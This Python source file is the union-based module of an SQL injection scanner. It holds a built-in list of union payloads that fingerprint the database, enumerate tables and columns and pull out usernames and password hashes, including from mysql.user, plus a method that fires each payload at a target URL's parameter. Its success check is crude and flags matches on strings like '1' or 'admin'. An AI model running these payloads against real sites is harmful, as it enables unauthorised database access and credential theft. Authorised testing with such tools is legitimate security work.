"""
Union-Based SQL Injection Engine
"""

import os
from utils.http_client import HttpClient

class UnionEngine:
    def __init__(self):
        self.http_client = HttpClient()
        self.payloads_file = os.path.join("payloads", "union_payloads.txt")
        self.payloads = self._load_payloads()
    
    def _load_payloads(self):
        """Load union-based payloads from file"""
        default_payloads = [
            # Basic union payloads
            "' UNION SELECT null--", "' UNION SELECT 1--", "' UNION SELECT 1,2--", 
            "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4--", "' UNION SELECT 1,2,3,4,5--",
            
            # Union with version detection
            "' UNION SELECT @@version--", "' UNION SELECT version()--", 
            "' UNION SELECT null,@@version--", "' UNION SELECT null,version()--",
            
            # Union with database info
            "' UNION SELECT database()--", "' UNION SELECT null,database()--",
            "' UNION SELECT user()--", "' UNION SELECT null,user()--",
            "' UNION SELECT current_user--", "' UNION SELECT null,current_user--",
            
            # Union with table enumeration
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT null,table_name FROM information_schema.tables--",
            "' UNION SELECT table_schema,table_name FROM information_schema.tables--",
            
            # Union with column enumeration
            "' UNION SELECT column_name FROM information_schema.columns--",
            "' UNION SELECT null,column_name FROM information_schema.columns--",
            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
            
            # Union with data extraction
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT null,concat(username,':',password) FROM users--",
            "' UNION SELECT null,concat(user,':',password) FROM mysql.user--",
            
            # Alternative comment syntax
            "' UNION SELECT 1#", "' UNION SELECT 1,2#", "' UNION SELECT 1,2,3#",
            "' UNION SELECT null/*", "' UNION SELECT 1/*", "' UNION SELECT 1,2/*",
            
            # With different quote types
            "\" UNION SELECT 1--", "\" UNION SELECT 1,2--",
            "') UNION SELECT 1--", "') UNION SELECT 1,2--",
            "') UNION SELECT 1,2,3--",
            
            # Advanced union techniques
            "' UNION ALL SELECT 1--", "' UNION ALL SELECT 1,2--",
            "' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b--",
            "' UNION SELECT 1 FROM information_schema.tables--"
        ]
        
        try:
            if os.path.exists(self.payloads_file):
                with open(self.payloads_file, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                return payloads[:40]
            else:
                print(f"   Payload file not found: {self.payloads_file}, using defaults")
                return default_payloads
        except Exception as e:
            print(f"   Error loading payloads: {e}, using defaults")
            return default_payloads
    
    def test(self, param, url):
        """Test for union-based SQL injection"""
        try:
            baseline_response = self.http_client.get(url, {param: "1"})
            
            for payload in self.payloads:
                try:
                    response = self.http_client.get(url, {param: f"1{payload}"})
                    
                    if not response:
                        continue
                    
                    # Check for union success indicators
                    if self._detect_union_success(response, baseline_response):
                        return {
                            "vulnerable": True,
                            "payload": payload, 
                            "response": response,
                            "evidence": "Union query executed successfully - database information exposed"
                        }
                        
                except Exception as e:
                    continue
            
            return None
        except Exception as e:
            print(f"   Union test error: {e}")
            return None
    
    def _detect_union_success(self, response, baseline_response):
        """Detect successful union injection"""
        if not response:
            return False
            
        # Check for common database error messages that indicate union worked
        error_indicators = [
            "mysql_fetch_array", "mysql_fetch_assoc", "mysql_num_rows",
            "ORA-", "Oracle", "Microsoft OLE DB", "ODBC Driver",
            "SQLServer", "PostgreSQL", "SQLite", "SQL syntax",
            "union", "select", "from", "where", "column", "table"
        ]
        
        response_lower = response.lower()
        
        # Count how many SQL-related indicators we find
        indicator_count = sum(1 for indicator in error_indicators if indicator in response_lower)
        
        # Also check if response is significantly different from baseline
        baseline_len = len(baseline_response) if baseline_response else 0
        response_len = len(response) if response else 0
        
        length_diff = abs(baseline_len - response_len) > 100 if baseline_len > 0 else False
        
        # Check for common union result patterns
        union_indicators = ["1", "2", "3", "admin", "root", "version", "user", "database"]
        union_content = any(indicator in response for indicator in union_indicators)
        
        return indicator_count >= 2 or length_diff or union_content